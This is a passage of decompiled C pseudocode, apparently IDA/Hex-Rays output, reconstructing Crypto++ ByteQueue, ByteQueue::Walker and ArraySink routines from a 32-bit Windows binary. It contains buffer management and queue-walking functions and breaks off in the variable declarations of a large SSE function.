// 4BC6D4: using guessed type void *CryptoPP::ByteQueue::`vftable';
// 4BC78C: using guessed type void *CryptoPP::ByteQueue::`vftable';

//----- (0045F1C0) --------------------------------------------------------
_DWORD *__thiscall sub_45F1C0(_DWORD *this, _DWORD *a2)
{
  void *v3; // eax
  void *v4; // ecx
  _DWORD *result; // eax

  *this = *a2;
  this[2] = a2[2];
  this[3] = a2[3];
  v3 = (void *)a2[3];
  if ( v3 )
    v3 = sub_45AEA0(a2[3]);
  this[4] = v3;
  v4 = (void *)a2[4];
  if ( v4 )
    sub_438F30(v3, this[3], v4, a2[3]);
  result = this;
  this[5] = a2[5];
  this[6] = a2[6];
  return result;
}

//----- (0045F220) --------------------------------------------------------
_DWORD *__thiscall sub_45F220(_DWORD *this, int a2)
{
  sub_435E90(this, 0);
  *this = &CryptoPP::ByteQueue::Walker::`vftable';
  this[1] = &CryptoPP::ByteQueue::Walker::`vftable';
  this[3] = a2;
  this[4] = 0;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  this[9] = 0;
  this[10] = 0;
  sub_437570(this, (int)off_4E8018[0], -1);
  return this;
}
// 4B8960: using guessed type void *CryptoPP::ByteQueue::Walker::`vftable';
// 4B8A18: using guessed type void *CryptoPP::ByteQueue::Walker::`vftable';
// 4E8018: using guessed type void ***off_4E8018[3];

//----- (0045F2D0) --------------------------------------------------------
_DWORD *__thiscall sub_45F2D0(_DWORD *this, int a2)
{
  sub_45F8D0(this);
  sub_45F4D0(this, a2);
  return this;
}

//----- (0045F2E9) --------------------------------------------------------
_DWORD *__thiscall sub_45F2E9(_DWORD *this, char a2)
{
  return sub_45F300(this - 1, a2);
}

//----- (0045F300) --------------------------------------------------------
_DWORD *__thiscall sub_45F300(_DWORD *this, char a2)
{
  *this = &CryptoPP::ByteQueue::`vftable';
  this[1] = &CryptoPP::ByteQueue::`vftable';
  sub_45F8D0(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BC6D4: using guessed type void *CryptoPP::ByteQueue::`vftable';
// 4BC78C: using guessed type void *CryptoPP::ByteQueue::`vftable';

//----- (0045F370) --------------------------------------------------------
void __thiscall sub_45F370(_DWORD *this)
{
  _DWORD *v2; // esi
  _DWORD *v3; // edx
  void *v4; // [esp-4h] [ebp-20h]

  if ( this[5] )
  {
    v2 = (_DWORD *)this[5];
    do
    {
      v3 = v2;
      if ( v2 == (_DWORD *)this[6] )
        break;
      if ( v2[5] != v2[3] )
        break;
      this[5] = *v2;
      v4 = (void *)v2[4];
      memset(v4, 0, *(_DWORD *)((char *)v2 + (v2[2] < v2[3] ? 0xFFFFFFFC : 0) + 12));
      j_j___free_base(v4);
      sub_46C87D(v2);
      v3 = (_DWORD *)this[5];
      v2 = v3;
    }
    while ( v3 );
    if ( v3 )
    {
      if ( v3[6] == v3[5] )
      {
        v3[6] = 0;
        v3[5] = 0;
      }
    }
  }
}

//----- (0045F420) --------------------------------------------------------
_DWORD *__thiscall sub_45F420(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // esi
  _DWORD *v3; // ebx
  _DWORD *result; // eax
  void *v5; // [esp-4h] [ebp-24h]
  _DWORD *v6; // [esp+10h] [ebp-10h]

  v6 = this;
  v1 = this[5];
  v2 = *(_DWORD **)v1;
  if ( *(_DWORD *)v1 )
  {
    do
    {
      v3 = (_DWORD *)*v2;
      v5 = (void *)v2[4];
      memset(v5, 0, *(_DWORD *)((char *)v2 + (v2[2] < v2[3] ? 0xFFFFFFFC : 0) + 12));
      j_j___free_base(v5);
      sub_46C87D(v2);
      v2 = v3;
    }
    while ( v3 );
    this = v6;
    v1 = v6[5];
  }
  this[6] = v1;
  *(_DWORD *)(v1 + 24) = 0;
  *(_DWORD *)(v1 + 20) = 0;
  result = (_DWORD *)this[5];
  *result = 0;
  this[8] = 0;
  return result;
}

//----- (0045F4D0) --------------------------------------------------------
int __thiscall sub_45F4D0(_DWORD *this, int a2)
{
  int v3; // esi
  _DWORD *v4; // eax
  _DWORD *v5; // ecx
  size_t *v6; // edi
  size_t *v7; // eax
  size_t *v8; // esi
  void *v9; // eax
  void *v10; // ecx
  _DWORD **v11; // eax

  v3 = a2;
  this[8] = 0;
  *((_BYTE *)this + 12) = *(_BYTE *)(a2 + 12);
  this[4] = *(_DWORD *)(a2 + 16);
  v4 = operator new(0x1Cu);
  if ( v4 )
    v5 = sub_45F1C0(v4, *(_DWORD **)(a2 + 20));
  else
    v5 = 0;
  this[6] = v5;
  this[5] = v5;
  v6 = **(size_t ***)(a2 + 20);
  if ( v6 )
  {
    do
    {
      v7 = (size_t *)operator new(0x1Cu);
      v8 = v7;
      if ( v7 )
      {
        *v7 = *v6;
        v7[2] = v6[2];
        v7[3] = v6[3];
        v9 = (void *)v6[3];
        if ( v9 )
          v9 = sub_45AEA0(v6[3]);
        v8[4] = (size_t)v9;
        v10 = (void *)v6[4];
        if ( v10 )
          sub_438F30(v9, v8[3], v10, v6[3]);
        v8[5] = v6[5];
        v8[6] = v6[6];
      }
      else
      {
        v8 = 0;
      }
      *(_DWORD *)this[6] = v8;
      v11 = (_DWORD **)this[6];
      v5 = *v11;
      this[6] = *v11;
      v6 = (size_t *)*v6;
    }
    while ( v6 );
    v3 = a2;
  }
  *v5 = 0;
  return (*(int (__thiscall **)(_DWORD *, _DWORD, _DWORD, _DWORD, int))(*this + 24))(
           this,
           *(_DWORD *)(v3 + 28),
           *(_DWORD *)(v3 + 32),
           0,
           1);
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0045F610) --------------------------------------------------------
int __thiscall sub_45F610(void *this, int a2, int *a3, __int64 a4, int a5, int a6)
{
  int result; // eax
  bool v8; // cf
  __int64 v9; // [esp+10h] [ebp-3Ch] BYREF
  int v10[6]; // [esp+18h] [ebp-34h] BYREF
  __int64 v11; // [esp+30h] [ebp-1Ch]
  int v12; // [esp+38h] [ebp-14h]
  int v13; // [esp+3Ch] [ebp-10h]
  int v14; // [esp+40h] [ebp-Ch]

  sub_435E90(v10, 0);
  v10[0] = (int)&CryptoPP::ByteQueue::Walker::`vftable';
  v10[1] = (int)&CryptoPP::ByteQueue::Walker::`vftable';
  v10[3] = (int)this;
  v10[4] = 0;
  v11 = 0i64;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  sub_437570(v10, (int)off_4E8018[0], -1);
  sub_438130(v10, *a3, a3[1]);
  v9 = a4 - *(_QWORD *)a3;
  result = sub_460010(v10, a2, (unsigned int *)&v9, a5, a6);
  v8 = __CFADD__((_DWORD)v9, *a3);
  *a3 += v9;
  a3[1] += HIDWORD(v9) + v8;
  return result;
}
// 4B8960: using guessed type void *CryptoPP::ByteQueue::Walker::`vftable';
// 4B8A18: using guessed type void *CryptoPP::ByteQueue::Walker::`vftable';
// 4E8018: using guessed type void ***off_4E8018[3];

//----- (0045F6F0) --------------------------------------------------------
int __thiscall sub_45F6F0(_DWORD *this, int a2, int *a3, __int64 a4, int a5, int a6)
{
  int v6; // eax
  int result; // eax
  bool v8; // cf
  int v9; // [esp-8h] [ebp-50h]
  int v10; // [esp-4h] [ebp-4Ch]
  __int64 v11; // [esp+Ch] [ebp-3Ch] BYREF
  int v12[12]; // [esp+14h] [ebp-34h] BYREF

  v12[2] = this[2];
  v12[3] = this[3];
  v12[4] = this[4];
  v12[6] = this[6];
  v10 = a3[1];
  v9 = *a3;
  v12[7] = this[7];
  v12[8] = this[8];
  v12[9] = this[9];
  v6 = this[10];
  v12[0] = (int)&CryptoPP::ByteQueue::Walker::`vftable';
  v12[1] = (int)&CryptoPP::ByteQueue::Walker::`vftable';
  v12[10] = v6;
  sub_438130(v12, v9, v10);
  v11 = a4 - *(_QWORD *)a3;
  result = sub_460010(v12, a2, (unsigned int *)&v11, a5, a6);
  v8 = __CFADD__((_DWORD)v11, *a3);
  *a3 += v11;
  a3[1] += HIDWORD(v11) + v8;
  return result;
}
// 4B8960: using guessed type void *CryptoPP::ByteQueue::Walker::`vftable';
// 4B8A18: using guessed type void *CryptoPP::ByteQueue::Walker::`vftable';

//----- (0045F7B0) --------------------------------------------------------
int __thiscall sub_45F7B0(int *this, size_t *a2)
{
  int v3; // ecx
  int v4; // eax
  int v5; // ecx
  _DWORD *v6; // eax
  _DWORD *v7; // esi
  size_t v8; // ecx
  void *v9; // eax
  int *v10; // eax
  int v12; // [esp-10h] [ebp-30h]

  v3 = this[8];
  if ( v3 )
  {
    v4 = *this;
    v12 = this[7];
    this[8] = 0;
    (*(void (__thiscall **)(int *, int, int, _DWORD, int))(v4 + 24))(this, v12, v3, 0, 1);
  }
  v5 = this[6];
  if ( *(_DWORD *)(v5 + 24) == *(_DWORD *)(v5 + 12) )
  {
    v6 = operator new(0x1Cu);
    v7 = v6;
    if ( v6 )
    {
      v8 = this[4];
      if ( v8 < *a2 )
        v8 = *a2;
      v6[2] = -1;
      v6[3] = v8;
      if ( v8 )
        v9 = sub_45AEA0(v8);
      else
        v9 = 0;
      v7[4] = v9;
      v7[6] = 0;
      v7[5] = 0;
      *v7 = 0;
    }
    else
    {
      v7 = 0;
    }
    *(_DWORD *)this[6] = v7;
    v10 = (int *)this[6];
    v5 = *v10;
    this[6] = *v10;
  }
  *a2 = *(_DWORD *)(v5 + 12) - *(_DWORD *)(v5 + 24);
  return *(_DWORD *)(this[6] + 16) + *(_DWORD *)(this[6] + 24);
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0045F890) --------------------------------------------------------
__int64 __thiscall sub_45F890(_DWORD *this)
{
  _DWORD *v2; // eax
  __int64 i; // rdi
  int v4; // ecx

  v2 = (_DWORD *)this[5];
  for ( i = 0i64; v2; i += (unsigned int)v4 )
  {
    v4 = v2[6] - v2[5];
    v2 = (_DWORD *)*v2;
  }
  return i + (unsigned int)this[8];
}

//----- (0045F8D0) --------------------------------------------------------
void __thiscall sub_45F8D0(_DWORD *this)
{
  _DWORD *v1; // esi
  _DWORD *v2; // ebx
  void *v3; // [esp-4h] [ebp-20h]

  v1 = (_DWORD *)this[5];
  if ( v1 )
  {
    do
    {
      v2 = (_DWORD *)*v1;
      v3 = (void *)v1[4];
      memset(v3, 0, *(_DWORD *)((char *)v1 + (v1[2] < v1[3] ? 0xFFFFFFFC : 0) + 12));
      j_j___free_base(v3);
      sub_46C87D(v1);
      v1 = v2;
    }
    while ( v2 );
  }
}

//----- (0045F960) --------------------------------------------------------
int __thiscall sub_45F960(int this, _BYTE *a2)
{
  _DWORD *v3; // ecx
  int v4; // edi
  int v5; // esi
  int result; // eax

  v3 = *(_DWORD **)(this + 20);
  v4 = v3[5];
  if ( v3[6] == v4 )
  {
    v5 = 0;
  }
  else
  {
    v5 = 1;
    *a2 = *(_BYTE *)(v4 + v3[4]);
    v4 = v3[5];
  }
  v3[5] = v4 + v5;
  if ( v5 )
  {
    if ( *(_DWORD *)(*(_DWORD *)(this + 20) + 20) == *(_DWORD *)(*(_DWORD *)(this + 20) + 12) )
      sub_45F370((_DWORD *)this);
    return 1;
  }
  else if ( *(_DWORD *)(this + 32) )
  {
    *a2 = **(_BYTE **)(this + 28);
    result = 1;
    ++*(_DWORD *)(this + 28);
    --*(_DWORD *)(this + 32);
  }
  else
  {
    return 0;
  }
  return result;
}

//----- (0045F9E0) --------------------------------------------------------
int __thiscall sub_45F9E0(int *this, int a2, int a3)
{
  int v4; // eax
  int v6[2]; // [esp+Ch] [ebp-38h] BYREF
  int v7[6]; // [esp+14h] [ebp-30h] BYREF
  __int64 v8; // [esp+2Ch] [ebp-18h]
  int v9; // [esp+40h] [ebp-4h]

  sub_435E90(v7, 0);
  v7[0] = (int)&CryptoPP::ArraySink::`vftable';
  v7[1] = (int)&CryptoPP::ArraySink::`vftable';
  v7[3] = a2;
  v7[4] = a3;
  v8 = 0i64;
  v4 = *this;
  v9 = 0;
  v6[0] = a3;
  v6[1] = 0;
  (*(void (__thiscall **)(int *, int *, int *, int *, int))(v4 + 128))(this, v7, v6, &dword_4EEDC0, 1);
  return v6[0];
}
// 4B8EB4: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4B8F6C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (0045FA90) --------------------------------------------------------
int __thiscall sub_45FA90(int *this, int a2)
{
  int v3; // eax
  int v5[2]; // [esp+8h] [ebp-38h] BYREF
  int v6[6]; // [esp+10h] [ebp-30h] BYREF
  __int64 v7; // [esp+28h] [ebp-18h]
  int v8; // [esp+3Ch] [ebp-4h]

  sub_435E90(v6, 0);
  v6[0] = (int)&CryptoPP::ArraySink::`vftable';
  v6[1] = (int)&CryptoPP::ArraySink::`vftable';
  v6[3] = a2;
  v6[4] = 1;
  v7 = 0i64;
  v3 = *this;
  v8 = 0;
  v5[0] = 1;
  v5[1] = 0;
  (*(void (__thiscall **)(int *, int *, int *, int *, int))(v3 + 128))(this, v6, v5, &dword_4EEDC0, 1);
  return v5[0];
}
// 4B8EB4: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4B8F6C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (0045FB40) --------------------------------------------------------
bool __thiscall sub_45FB40(_DWORD *this)
{
  int v1; // edx

  v1 = this[5];
  return v1 == this[6] && *(_DWORD *)(v1 + 24) == *(_DWORD *)(v1 + 20) && !this[8];
}

//----- (0045FB60) --------------------------------------------------------
_DWORD *__thiscall sub_45FB60(_DWORD *this, int a2)
{
  char v3; // al
  int v4; // ecx

  v3 = (*(int (__thiscall **)(int, const char *, int *, int *))(*(_DWORD *)a2 + 4))(
         a2,
         "NodeSize",
         &int `RTTI Type Descriptor',
         &a2);
  v4 = 256;
  if ( v3 )
    v4 = a2;
  this[4] = v4;
  return sub_45F420(this);
}
// 4EE1D4: using guessed type int int `RTTI Type Descriptor';

//----- (0045FBA0) --------------------------------------------------------
int __thiscall sub_45FBA0(_DWORD *this, int a2)
{
  _DWORD *v2; // edx
  int result; // eax

  v2 = (_DWORD *)this[3];
  this[4] = v2[5];
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  this[9] = v2[7];
  result = v2[8];
  this[10] = result;
  return result;
}

//----- (0045FBD0) --------------------------------------------------------
int __thiscall sub_45FBD0(int this, _BYTE *a2)
{
  _DWORD *v2; // eax
  int v3; // edx

  v2 = *(_DWORD **)(this + 20);
  v3 = v2[5];
  if ( v2[6] == v3 )
  {
    if ( *(_DWORD *)(this + 32) )
    {
      *a2 = **(_BYTE **)(this + 28);
      return 1;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    *a2 = *(_BYTE *)(v3 + v2[4]);
    return 1;
  }
}

//----- (0045FC10) --------------------------------------------------------
int __thiscall sub_45FC10(int *this, int a2, int a3)
{
  int v4; // eax
  __int64 v6; // [esp+Ch] [ebp-38h] BYREF
  int v7[6]; // [esp+14h] [ebp-30h] BYREF
  __int64 v8; // [esp+2Ch] [ebp-18h]
  int v9; // [esp+40h] [ebp-4h]

  sub_435E90(v7, 0);
  v7[0] = (int)&CryptoPP::ArraySink::`vftable';
  v7[1] = (int)&CryptoPP::ArraySink::`vftable';
  v7[3] = a2;
  v7[4] = a3;
  v8 = 0i64;
  v4 = *this;
  v9 = 0;
  v6 = 0i64;
  (*(void (__thiscall **)(int *, int *, __int64 *, int, _DWORD, int *, int))(v4 + 132))(
    this,
    v7,
    &v6,
    a3,
    0,
    &dword_4EEDC0,
    1);
  return v6;
}
// 4B8EB4: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4B8F6C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (0045FCB0) --------------------------------------------------------
int __thiscall sub_45FCB0(int *this, int a2)
{
  int v3; // eax
  __int64 v5; // [esp+8h] [ebp-38h] BYREF
  int v6[6]; // [esp+10h] [ebp-30h] BYREF
  __int64 v7; // [esp+28h] [ebp-18h]
  int v8; // [esp+3Ch] [ebp-4h]

  sub_435E90(v6, 0);
  v6[0] = (int)&CryptoPP::ArraySink::`vftable';
  v6[1] = (int)&CryptoPP::ArraySink::`vftable';
  v6[3] = a2;
  v6[4] = 1;
  v7 = 0i64;
  v3 = *this;
  v8 = 0;
  v5 = 0i64;
  (*(void (__thiscall **)(int *, int *, __int64 *, int, _DWORD, int *, int))(v3 + 132))(
    this,
    v6,
    &v5,
    1,
    0,
    &dword_4EEDC0,
    1);
  return v5;
}
// 4B8EB4: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4B8F6C: using guessed type void *CryptoPP::ArraySink::`vftable';
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (0045FD50) --------------------------------------------------------
int __thiscall sub_45FD50(_DWORD *this, char *a2, unsigned int a3, int a4, int a5)
{
  int v6; // ecx
  char *v7; // edx
  int v8; // eax
  _DWORD *v9; // ecx
  unsigned int v10; // esi
  size_t v11; // edi
  char *v12; // edx
  char *v13; // eax
  bool v14; // zf
  unsigned int v15; // eax
  _DWORD *v16; // edi
  void **v17; // ecx
  void *v18; // eax
  _DWORD *v19; // eax
  int v21; // [esp-10h] [ebp-3Ch]
  _DWORD *v22; // [esp+14h] [ebp-18h]
  char *Src; // [esp+18h] [ebp-14h]

  v6 = this[8];
  v7 = a2;
  Src = a2;
  if ( v6 )
  {
    v8 = *this;
    v21 = this[7];
    this[8] = 0;
    (*(void (__thiscall **)(_DWORD *, int, int, _DWORD, int))(v8 + 24))(this, v21, v6, 0, 1);
    v7 = a2;
  }
  v9 = (_DWORD *)this[6];
  v10 = a3;
  while ( 1 )
  {
    v22 = v9;
    if ( !v7 || !v10 )
      break;
    v11 = v10;
    v12 = Src;
    if ( v9[3] - v9[6] < v10 )
      v11 = v9[3] - v9[6];
    v13 = (char *)(v9[6] + v9[4]);
    if ( v13 != Src )
    {
      memmove(v13, Src, v11);
      v9 = v22;
      v12 = Src;
    }
    v9[6] += v11;
    if ( v11 >= v10 )
      break;
    v10 -= v11;
    v14 = *((_BYTE *)this + 12) == 0;
    Src = &v12[v11];
    a3 = v10;
    if ( !v14 )
    {
      v15 = this[4];
      if ( v15 < 0x4000 )
      {
        do
        {
          v15 *= 2;
          this[4] = v15;
        }
        while ( v15 < v10 && v15 < 0x4000 );
      }
    }
    v16 = operator new(0x1Cu);
    if ( v16 )
    {
      v17 = (void **)&a3;
      if ( this[4] >= v10 )
        v17 = (void **)(this + 4);
      v18 = *v17;
      v16[2] = -1;
      v16[3] = v18;
      if ( v18 )
        v18 = sub_45AEA0((size_t)v18);
      v16[4] = v18;
      v16[6] = 0;
      v16[5] = 0;
      *v16 = 0;
    }
    else
    {
      v16 = 0;
    }
    v7 = Src;
    *(_DWORD *)this[6] = v16;
    v19 = (_DWORD *)this[6];
    v9 = (_DWORD *)*v19;
    this[6] = *v19;
  }
  return 0;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0045FEC0) --------------------------------------------------------
int __thiscall sub_45FEC0(int this, _DWORD *a2, unsigned int *a3, int a4, char a5)
{
  _DWORD *v5; // edx
  _DWORD *v7; // ebx
  unsigned int v8; // edi
  unsigned int v9; // ebp
  int v10; // ecx
  unsigned int v11; // esi
  unsigned int v12; // esi
  int v13; // eax
  bool v14; // cf
  int v16; // esi
  int v17; // [esp-4h] [ebp-64h]
  _DWORD v19[12]; // [esp+2Ch] [ebp-34h] BYREF

  v5 = a2;
  if ( a5 )
  {
    v7 = *(_DWORD **)(this + 20);
    v8 = *a3;
    v9 = a3[1];
    if ( *(_QWORD *)a3 )
    {
      while ( v7 )
      {
        v10 = v7[5];
        v11 = v7[6] - v10;
        if ( !v9 && v8 < v11 )
          v11 = v8;
        (*(void (__thiscall **)(_DWORD *, int, int, unsigned int, _DWORD, int))(*v5 + 144))(
          a2,
          a4,
          v10 + v7[4],
          v11,
          0,
          1);
        v7[5] += v11;
        v7 = (_DWORD *)*v7;
        v9 = (__PAIR64__(v9, v8) - v11) >> 32;
        v8 -= v11;
        if ( !__PAIR64__(v9, v8) )
          break;
        v5 = a2;
      }
    }
    sub_45F370((_DWORD *)this);
    v12 = *(_DWORD *)(this + 32);
    if ( !v9 && v12 >= v8 )
      v12 = v8;
    if ( v12 )
    {
      v13 = *a2;
      v17 = *(_DWORD *)(this + 28);
      if ( *(_BYTE *)(this + 36) )
        (*(void (__thiscall **)(_DWORD *, int, int, unsigned int, _DWORD, int))(v13 + 144))(a2, a4, v17, v12, 0, 1);
      else
        (*(void (__thiscall **)(_DWORD *, int, int, unsigned int, _DWORD, int))(v13 + 140))(a2, a4, v17, v12, 0, 1);
      *(_DWORD *)(this + 28) += v12;
      *(_DWORD *)(this + 32) -= v12;
      v9 = (__PAIR64__(v9, v8) - v12) >> 32;
      v8 -= v12;
    }
    v14 = *a3 < v8;
    *a3 -= v8;
    a3[1] -= v14 + v9;
    return 0;
  }
  else
  {
    sub_45F220(v19, this);
    v16 = sub_460010(v19, (int)a2, a3, a4, 0);
    (*(void (__thiscall **)(int, unsigned int, unsigned int))(*(_DWORD *)this + 88))(this, *a3, a3[1]);
    return v16;
  }
}
// 45FEC0: using guessed type _DWORD var_34[12];

//----- (00460010) --------------------------------------------------------
int __thiscall sub_460010(_DWORD *this, int a2, unsigned int *a3, int a4, int a5)
{
  _DWORD *v5; // esi
  unsigned int v6; // ebx
  unsigned int v7; // ebp
  _DWORD *v8; // ecx
  unsigned int v9; // edx
  unsigned int v10; // edi
  int v11; // ecx
  _DWORD *v12; // eax
  unsigned int v13; // edi
  unsigned int v15; // [esp+1Ch] [ebp-8h]
  _DWORD *v16; // [esp+20h] [ebp-4h]

  v5 = this;
  v6 = *a3;
  v7 = a3[1];
  v8 = (_DWORD *)this[4];
  v16 = v5;
  if ( v8 )
  {
    v9 = v5[8];
    v15 = v9;
    while ( 1 )
    {
      v10 = v8[6] - v8[5] - v9;
      if ( (unsigned int)(v8[6] - v8[5]) - (unsigned __int64)v9 >= __PAIR64__(v7, v6) )
        v10 = v6;
      v5 = v16;
      v11 = (*(int (__thiscall **)(int, int, unsigned int, unsigned int, _DWORD, int))(*(_DWORD *)a2 + 140))(
              a2,
              a4,
              v8[4] + v8[5] + v15,
              v10,
              0,
              a5);
      if ( v11 )
        break;
      *((_QWORD *)v16 + 3) += v10;
      v7 = (__PAIR64__(v7, v6) - v10) >> 32;
      v6 -= v10;
      if ( !__PAIR64__(v7, v6) )
      {
        v16[8] += v10;
        *(_QWORD *)a3 -= __PAIR64__(v7, v6);
        return 0;
      }
      v12 = (_DWORD *)v16[4];
      v9 = 0;
      v15 = 0;
      v8 = (_DWORD *)*v12;
      v16[4] = *v12;
      v16[8] = 0;
      if ( !v8 )
        goto LABEL_8;
    }
  }
  else
  {
LABEL_8:
    if ( v7 | v6 && (v13 = v5[10]) != 0 )
    {
      if ( !v7 && v13 >= v6 )
        v13 = v6;
      v11 = (*(int (__thiscall **)(int, int, _DWORD, unsigned int, _DWORD, int))(*(_DWORD *)a2 + 140))(
              a2,
              a4,
              v5[9],
              v13,
              0,
              a5);
      if ( !v11 )
      {
        v5[9] += v13;
        v5[10] -= v13;
        *(_QWORD *)a3 -= __PAIR64__(v7, v6) - v13;
        return 0;
      }
    }
    else
    {
      v11 = 0;
    }
  }
  *(_QWORD *)a3 -= __PAIR64__(v7, v6);
  return v11;
}

//----- (00460150) --------------------------------------------------------
int __thiscall sub_460150(_DWORD *this, __m128i *a2, unsigned int a3)
{
  char v3; // al
  __m128i *v5; // ecx
  __m128i *v6; // esi
  int result; // eax
  unsigned int v8; // ebx
  int v9; // ecx
  int v10; // eax
  int v11; // edi
  __int32 v12; // ebx
  __int32 v13; // esi
  unsigned int v14; // edx
  __int32 *v15; // eax
  unsigned int v16; // ecx
  int v17; // eax
  int v18; // ecx
  int v19; // esi
  int v20; // ecx
  int v21; // edx
  int v22; // edi
  int v23; // ebx
  int v24; // eax
  int v25; // ebx
  int v26; // edi
  int v27; // eax
  int v28; // ebx
  int v29; // edi
  int v30; // eax
  int v31; // ebx
  int v32; // edi
  int v33; // eax
  int v34; // ecx
  int v35; // ebx
  int v36; // edx
  int v37; // eax
  int v38; // ecx
  int v39; // edx
  int v40; // eax
  int v41; // ecx
  int v42; // edx
  int v43; // eax
  _DWORD *v44; // edi
  _DWORD *v45; // esi
  _DWORD *v46; // edx
  unsigned int v47; // eax
  int v48; // ecx
  unsigned int v49; // eax
  int v50; // ecx
  int v51; // ebx
  unsigned int v52; // eax
  _DWORD *v53; // ecx
  unsigned int v54; // eax
  int v55; // ecx
  unsigned int v56; // eax
  int v57; // ebx
  int v58; // ecx
  unsigned int v59; // eax
  unsigned int v60; // ecx
  int v61; // ebx
  _DWORD *v62; // edx
  int v63; // edi
  _DWORD *v64; // ecx
  int v65; // edi
  int v66; // ecx
  int v67; // eax
  int v68; // ebx
  unsigned int v69; // edi
  int v70; // edx
  __int32 *v71; // esi
  unsigned int v72; // ebx
  unsigned int v73; // edx
  unsigned int v74; // edi
  int v75; // edx
  unsigned int v76; // ecx
  int v77; // edi
  int v78; // ecx
  const __m128i *v79; // ecx
  unsigned int v80; // edx
  __m128i si128; // xmm0
  __m128i v82; // xmm0
  int v83; // ebx
  unsigned int v84; // eax
  unsigned int v85; // ebx
  __m128i v86; // xmm5
  __m128i v87; // xmm4
  __m128i v88; // xmm3
  __m128i v89; // xmm2
  __m128i v90; // xmm0
  unsigned int v91; // eax
  __m128i v92; // xmm5
  __m128i v93; // xmm4
  __m128i v94; // xmm3
  __m128i v95; // xmm2
  unsigned int v96; // ebx
  __m128i v97; // xmm5
  __m128i v98; // xmm4
  __m128i v99; // xmm3
  __m128i v100; // xmm2
  __m128i v101; // xmm0
  unsigned int v102; // eax
  __m128i v103; // xmm5
  __m128i v104; // xmm4
  __m128i v105; // xmm3
  __m128i v106; // xmm2
  unsigned int v107; // ebx
  __m128i v108; // xmm5
  __m128i v109; // xmm4
  __m128i v110; // xmm3
  __m128i v111; // xmm2
  __m128i v112; // xmm0
  unsigned int v113; // eax
  __m128i v114; // xmm5
  __m128i v115; // xmm4
  __m128i v116; // xmm3
  __m128i v117; // xmm2
  unsigned int v118; // ebx
  __m128i v119; // xmm5
  __m128i v120; // xmm4
  __m128i v121; // xmm5
  __m128i v122; // xmm4
  __m128i v123; // xmm0
  __m128i v124; // xmm1
  unsigned int v125; // eax
  __m128i v126; // xmm0
  const __m128i *v127; // ecx
  unsigned int v128; // edx
  __m128i v129; // xmm0
  __m128i v130; // xmm1
  int v131; // eax
  __m128i v132; // xmm1
  __m128i v133; // xmm0
  int v134; // eax
  __m128i v135; // xmm1
  __m128i v136; // xmm0
  int v137; // eax
  __m128i v138; // xmm0
  int v139; // eax
  int v140; // [esp+Ch] [ebp-84h]
  __int32 *v141; // [esp+10h] [ebp-80h]
  int v142; // [esp+14h] [ebp-7Ch]
  int v143; // [esp+18h] [ebp-78h]
  __int32 *v144; // [esp+1Ch] [ebp-74h]
  int v145; // [esp+1Ch] [ebp-74h]
  unsigned int v146; // [esp+20h] [ebp-70h]
  int v147; // [esp+20h] [ebp-70h]
  unsigned int v148; // [esp+24h] [ebp-6Ch]
  int v149; // [esp+28h] [ebp-68h]
  int v150; // [esp+2Ch] [ebp-64h]
  unsigned int v151; // [esp+2Ch] [ebp-64h]
  int v152; // [esp+30h] [ebp-60h]
  int v153; // [esp+34h] [ebp-5Ch]
  int v154; // [esp+34h] [ebp-5Ch]
  int v155; // [esp+38h] [ebp-58h]
  int v156; // [esp+38h] [ebp-58h]
  int v157; // [esp+3Ch] [ebp-54h]
  int v158; // [esp+3Ch] [ebp-54h]
  int v159; // [esp+40h] [ebp-50h]
  int v160; // [esp+40h] [ebp-50h]
  int v161; // [esp+44h] [ebp-4Ch]
  int v162; // [esp+44h] [ebp-4Ch]
  int v163; // [esp+48h] [ebp-48h]
  int v164; // [esp+48h] [ebp-48h]
  int v165; // [esp+4Ch] [ebp-44h]
  _DWORD *v166; // [esp+4Ch] [ebp-44h]
  int v167; // [esp+50h] [ebp-40h]
  int v168; // [esp+50h] [ebp-40h]
  unsigned int v169; // [esp+54h] [ebp-3Ch]
  __m128i *v170; // [esp+58h] [ebp-38h]
  int v171; // [esp+58h] [ebp-38h]
  int v172; // [esp+58h] [ebp-38h]
  int v173; // [esp+5Ch] [ebp-34h]
  int v174; // [esp+60h] [ebp-30h]
  unsigned int v175; // [esp+60h] [ebp-30h]
  unsigned int v176; // [esp+64h] [ebp-2Ch]
  int v177; // [esp+68h] [ebp-28h]
  _DWORD *v178; // [esp+68h] [ebp-28h]
  _DWORD *v179; // [esp+68h] [ebp-28h]
  int v180; // [esp+68h] [ebp-28h]
  int v181; // [esp+68h] [ebp-28h]
  unsigned int v182; // [esp+6Ch] [ebp-24h]
  int v183; // [esp+6Ch] [ebp-24h]
  int v184; // [esp+70h] [ebp-20h]
  int v185; // [esp+70h] [ebp-20h]
  int v186; // [esp+74h] [ebp-1Ch]
  int v187; // [esp+74h] [ebp-1Ch]
  int v188; // [esp+78h] [ebp-18h]
  int v189; // [esp+78h] [ebp-18h]
  int v190; // [esp+78h] [ebp-18h]
  int v191; // [esp+7Ch] [ebp-14h]
  int v192; // [esp+80h] [ebp-10h]
  _DWORD *v193; // [esp+80h] [ebp-10h]
  int v194; // [esp+80h] [ebp-10h]
  int v195; // [esp+84h] [ebp-Ch]
  int v196; // [esp+84h] [ebp-Ch]
  unsigned int v197; // [esp+84h] [ebp-Ch]
  int v198; // [esp+88h] [ebp-8h]
  int v199; // [esp+88h] [ebp-8h]
  int v200; // [esp+88h] [ebp-8h]
  int v201; // [esp+88h] [ebp-8h]
  int v202; // [esp+88h] [ebp-8h]
  unsigned int v203; // [esp+8Ch] [ebp-4h]
